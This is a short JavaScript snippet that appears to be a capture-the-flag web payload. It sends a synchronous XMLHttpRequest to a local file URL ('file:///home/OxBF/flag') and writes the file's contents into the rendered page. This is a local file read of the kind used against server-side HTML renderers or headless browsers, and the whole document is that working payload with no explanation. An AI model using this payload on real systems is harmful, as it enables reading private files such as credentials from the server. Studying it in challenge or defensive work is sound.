x = new XMLHttpRequest();
x.open("GET", "file:///home/OxBF/flag", false);
x.send();
document.write(x.responseText);